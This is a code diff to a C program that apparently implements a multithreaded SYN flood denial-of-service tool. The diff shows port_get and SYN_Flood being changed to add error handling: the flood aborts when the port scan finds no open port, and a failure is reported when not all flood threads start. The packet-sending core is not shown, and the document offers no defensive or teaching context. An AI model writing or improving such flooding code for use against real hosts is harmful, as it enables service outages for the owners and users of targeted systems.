@@ -309,14 +309,25 @@ void *flood_animation(void *arg)
     return NULL;
 }
 
-void port_get(const char *target_ip){
-    //port scan 
-    port_select = portscanner(target_ip);
+int port_get(const char *target_ip){
+    //port scan
+    int selected = portscanner(target_ip);
+    if (selected < 0) {
+        fprintf(stderr, "\n\033[49m[!]\033[0m\033[1;31m Port selection aborted.\033[0m\n");
+        return -1;
+    }
+    if (selected == 0) {
+        fprintf(stderr, "\n\033[49m[!]\033[0m\033[1;31m No open port found on %s.\033[0m\n", target_ip);
+        return -1;
+    }
+    port_select = selected;
+    return 0;
 }
 // Starts THREAD_COUNT threads to flood the provided target IP
 int SYN_Flood(const char *target_ip) {
     stop_flag = 0;
-    port_get(target_ip);
+    if (port_get(target_ip) != 0)
+        return 1;
     // Set up signal handler
     struct sigaction sa;
     memset(&sa, 0, sizeof(sa));
@@ -358,6 +369,12 @@ int SYN_Flood(const char *target_ip) {
     }
     pthread_join(animasyon_thread, NULL);
     printf("[-]Thread\n");
-    
+
+    if (threads_created != THREAD_COUNT) {
+        fprintf(stderr, "Failed to start all flood threads (%d of %d)\n",
+                threads_created, THREAD_COUNT);
+        return 1;
+    }
+
     return 0;
 }
